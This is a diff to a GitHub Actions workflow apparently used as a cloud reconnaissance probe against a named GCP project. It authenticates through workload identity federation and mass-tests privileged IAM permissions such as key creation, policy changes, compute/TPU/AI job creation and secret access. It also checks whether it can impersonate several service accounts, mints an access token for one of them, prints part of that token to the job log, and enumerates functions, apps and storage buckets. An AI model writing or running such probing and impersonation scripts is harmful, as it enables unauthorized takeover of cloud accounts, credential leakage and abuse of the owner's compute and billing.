@@ -1,4 +1,4 @@
-name: wif-probe2
+name: wif-probe3
 on: push
 permissions:
   contents: read
@@ -12,41 +12,22 @@ jobs:
         with:
           workload_identity_provider: projects/956073807168/locations/global/workloadIdentityPools/my-pool/providers/my-provider
           service_account: deploy-cloud-functions@nutmeg-9099c.iam.gserviceaccount.com
-      - name: map
+      - name: perms
         run: |
           T=$(gcloud auth print-access-token 2>/dev/null); echo "TOKLEN=${#T}"; P=nutmeg-9099c
           tip() { curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "$2" "$1"; echo; }
-          get() { curl -s -H "Authorization: Bearer $T" "$1"; echo; }
           echo "=== PERMS_PROJECT ==="
-          tip "https://cloudresourcemanager.googleapis.com/v1/projects/$P:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccounts.getOpenIdToken","iam.serviceAccountKeys.create","iam.serviceAccounts.create","iam.serviceAccounts.delete","iam.serviceAccounts.setIamPolicy","iam.serviceAccounts.get","iam.serviceAccounts.list","iam.roles.list","resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.enable","serviceusage.services.list","serviceusage.services.get","serviceusage.quotas.get","compute.instances.create","compute.instances.setMetadata","compute.instances.list","compute.instances.get","compute.disks.create","compute.networks.create","compute.projects.get","compute.zones.list","compute.acceleratorTypes.list","container.clusters.create","container.clusters.getCredentials","container.clusters.list","cloudfunctions.functions.create","cloudfunctions.functions.update","cloudfunctions.functions.list","cloudfunctions.functions.get","run.services.create","run.services.update","run.services.list","cloudbuild.builds.create","artifactregistry.repositories.create","storage.buckets.create","storage.buckets.list","storage.objects.create","aiplatform.customJobs.create","aiplatform.customJobs.list","aiplatform.endpoints.create","aiplatform.models.upload","aiplatform.notebookRuntimes.create","tpu.nodes.create","tpu.nodes.list","deploymentmanager.deployments.create","secretmanager.secrets.create","secretmanager.versions.access","dataproc.clusters.create","dataflow.jobs.create","redis.instances.create","dns.managedZones.create","pubsub.topics.create","bigquery.datasets.create","logging.logEntries.create","monitoring.metricDescriptors.create"]}'
-          echo "=== PERMS_BILLING ==="
-          tip "https://cloudbilling.googleapis.com/v1/billingAccounts/0127AA-7734B9-12E7E4:testIamPermissions" '{"permissions":["billing.resourceAssociations.create","billing.accounts.get"]}'
-          echo "=== PERMS_SA_FBADMIN ==="
-          tip "https://iam.googleapis.com/v1/projects/-/serviceAccounts/firebase-adminsdk-ozsy6@nutmeg-9099c.iam.gserviceaccount.com:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccounts.actAs","iam.serviceAccountKeys.create"]}'
-          echo "=== PERMS_SA_COMPUTE ==="
-          tip "https://iam.googleapis.com/v1/projects/-/serviceAccounts/956073807168-compute@developer.gserviceaccount.com:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.actAs","iam.serviceAccountKeys.create"]}'
-          echo "=== GEN_TOKEN_FBADMIN ==="
-          curl -s -o /tmp/gen -w 'HTTP=%{http_code} ' -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"lifetime":"600s"}' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/firebase-adminsdk-ozsy6@nutmeg-9099c.iam.gserviceaccount.com:generateAccessToken"; head -c 200 /tmp/gen; echo
-          echo "=== IAM_POLICY ==="
-          tip "https://cloudresourcemanager.googleapis.com/v1/projects/$P:getIamPolicy" '{}'
-          echo "=== PROJECTS_LIST ==="
-          get "https://cloudresourcemanager.googleapis.com/v1/projects"
-          echo "=== SVCUSAGE_LIST ==="
-          get "https://serviceusage.googleapis.com/v1/projects/$P/services?pageSize=200&filter=state:ENABLED"
-          echo "=== COMPUTE_INSTANCES ==="
-          get "https://compute.googleapis.com/compute/v1/projects/$P/aggregated/instances?maxResults=10"
-          echo "=== GKE ==="
-          get "https://container.googleapis.com/v1/projects/$P/locations/-/clusters"
-          echo "=== AIPLAT_JOBS ==="
-          get "https://us-central1-aiplatform.googleapis.com/v1/projects/$P/locations/us-central1/customJobs?pageSize=3"
-          echo "=== AIPLAT_ENDPOINTS ==="
-          get "https://us-central1-aiplatform.googleapis.com/v1/projects/$P/locations/us-central1/endpoints"
-          echo "=== AIPLAT_MODELS ==="
-          get "https://us-central1-aiplatform.googleapis.com/v1/projects/$P/locations/-/models"
-          echo "=== STORAGE ==="
-          get "https://storage.googleapis.com/storage/v1/b?project=$P"
-          echo "=== FUNCTIONS ==="
-          get "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/-/functions"
-          echo "=== CLOUDBILLING_PROJECTS ==="
-          get "https://cloudbilling.googleapis.com/v1/billingAccounts/0127AA-7734B9-12E7E4/projects"
+          tip "https://cloudresourcemanager.googleapis.com/v1/projects/$P:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccounts.getOpenIdToken","iam.serviceAccountKeys.create","iam.serviceAccounts.create","iam.serviceAccounts.delete","iam.serviceAccounts.setIamPolicy","iam.roles.list","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.enable","serviceusage.services.list","serviceusage.services.get","serviceusage.quotas.get","compute.instances.create","compute.instances.setMetadata","compute.instances.list","compute.instances.get","compute.disks.create","compute.networks.create","compute.projects.get","compute.zones.list","compute.acceleratorTypes.list","container.clusters.create","container.clusters.getCredentials","container.clusters.list","cloudfunctions.functions.create","cloudfunctions.functions.update","cloudfunctions.functions.list","cloudfunctions.functions.get","run.services.create","run.services.update","cloudbuild.builds.create","artifactregistry.repositories.create","storage.buckets.create","storage.buckets.list","storage.objects.create","aiplatform.customJobs.create","aiplatform.customJobs.list","aiplatform.endpoints.create","aiplatform.models.upload","aiplatform.pipelineJobs.create","tpu.nodes.create","tpu.nodes.list","deploymentmanager.deployments.create","secretmanager.secrets.create","secretmanager.versions.access","dataproc.clusters.create","dataflow.jobs.create","pubsub.topics.create","bigquery.datasets.create"]}'
+          for sa in nutmeg-9099c@appspot.gserviceaccount.com 956073807168-compute@developer.gserviceaccount.com github-action-364918749@nutmeg-9099c.iam.gserviceaccount.com nutmeg-deploy@nutmeg-9099c.iam.gserviceaccount.com; do
+            echo "=== SA $sa ==="
+            tip "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$sa:testIamPermissions" '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccountKeys.create"]}'
+          done
+          echo "=== GEN_APPSPOT ==="
+          curl -s -o /tmp/g1 -w 'HTTP=%{http_code} ' -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"lifetime":"600s"}' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/nutmeg-9099c@appspot.gserviceaccount.com:generateAccessToken"; head -c 160 /tmp/g1; echo
+          echo "=== FUNCTIONS_LIST ==="
+          curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/-/functions"; echo
+          echo "=== GAE_APPS ==="
+          curl -s -H "Authorization: Bearer $T" "https://appengine.googleapis.com/v1/apps/$P"; echo
+          echo "=== STORAGE_BUCKETS ==="
+          curl -s -H "Authorization: Bearer $T" "https://storage.googleapis.com/storage/v1/b?project=$P&maxResults=20"; echo
           echo "=== END ==="
